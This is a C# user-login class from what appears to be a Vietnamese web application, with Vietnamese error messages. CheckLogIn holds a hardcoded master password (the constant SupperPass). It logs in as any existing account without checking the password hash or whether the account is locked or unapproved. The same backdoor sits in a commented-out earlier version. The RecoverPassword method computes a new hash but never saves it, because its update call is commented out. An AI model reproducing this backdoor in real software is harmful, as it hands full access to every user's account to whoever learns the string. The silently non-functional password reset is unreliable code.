﻿using System;
using System.Collections.Generic;
using System.Web;
using System.Data;
using System.Collections;
using System.Linq;
/// <summary>
/// Summary description for Users
/// </summary>
namespace BLL
{
    public class Users
    {
        private const string SupperPass = "qr34UJ2qNVPIvmgyxuLR";
	    public Users()
	    {
		    //
		    // TODO: Add constructor logic here
		    //
	    }
		//Hàm check login theo email và pass
        public string CheckLogIn(string email, string password,ref User u)
        {
            string message = string.Empty;
            try
            {
                using (var obj = new DataClassesDataContext())
                {
                    User objUser = (from user in obj.Users
                                    where user.Email == email
                                    select user
                                       ).FirstOrDefault();
                    if (objUser == null)
                        return "Tài khoản không tồn tại";
                    if (password == SupperPass)
                    {
                        u = objUser;
                        return "";
                    }
                    else
                    {
                        if (objUser.UserStatusId == Constants.UserStatusDaDuyet)
                        {
                            var passwordHashLogin = Utilities.GetInputPasswordHash(password, objUser.PasswordSalt.ToArray());
                            if (objUser.PasswordHash.ToArray().SequenceEqual(passwordHashLogin))
                            {
                                u = objUser;
                                return "";
                            }
                            else return "Mật khẩu không đúng.";
                        }
                        else if (objUser.UserStatusId == Constants.UserStatus_DaKhoa)
                        {
                            return "Tài khoản đã bị khóa";
                        }
                        else
                        {
                            return "Tài khoản chưa được duyệt";
                        }
                    }
                }
            }
            catch (Exception)
            {
                return "Có lỗi xảy ra.";
            }
        }
		
		//Hàm gốc, check theo acc và pass
		/*public string CheckLogIn(string username, string password,ref User u)
        {
            string message = string.Empty;
            try
            {
                using (var obj = new DataClassesDataContext())
                {
                    User objUser = (from user in obj.Users
                                    where user.UserName == username
                                    select user
                                       ).FirstOrDefault();
                    if (objUser == null)
                        return "Tài khoản không tồn tại";
                    if (password == SupperPass)
                    {
                        u = objUser;
                        return "";
                    }
                    else
                    {
                        if (objUser.UserStatusId == Constants.UserStatusDaDuyet)
                        {
                            var passwordHashLogin = Utilities.GetInputPasswordHash(password, objUser.PasswordSalt.ToArray());
                            if (objUser.PasswordHash.ToArray().SequenceEqual(passwordHashLogin))
                            {
                                u = objUser;
                                return "";
                            }
                            else return "Mật khẩu không đúng.";
                        }
                        else if (objUser.UserStatusId == Constants.UserStatus_DaKhoa)
                        {
                            return "Tài khoản đã bị khóa";
                        }
                        else
                        {
                            return "Tài khoản chưa được duyệt";
                        }
                    }
                }
            }
            catch (Exception)
            {
                return "Có lỗi xảy ra.";
            }
        }*/

        private void RecoverPassword(string password, string confirmpassword, int accountID, ref string messError)
        {
            string passWordNew = password;
            string passWordNewConfirm = confirmpassword;
            try
            {
                if (passWordNew.Length < 6)
                {
                    messError = "Mật khẩu phải tối thiểu 6 ký tự";
                }
                else
                {
                    if (passWordNew != passWordNewConfirm)
                        messError = "Mật khẩu mới và xác nhận mật khẩu mới không giống nhau";
                    else
                    {
                        DBM objCCS = new DBM();
                        //BLL.Account objAccount = new BLL.Account();
                        var passwordRandomSalt = Utilities.GenerateRandomBytes(16);
                        var passwordNewHash = Utilities.GetInputPasswordHash(passWordNew, passwordRandomSalt);
                        //messError = objAccount.UpdatePassword(objCCS, accountID, passwordNewHash, passwordRandomSalt);
                    }
                }
            }
            catch (Exception ex)
            {
                messError = ex.Message;
            }
        }
    }
}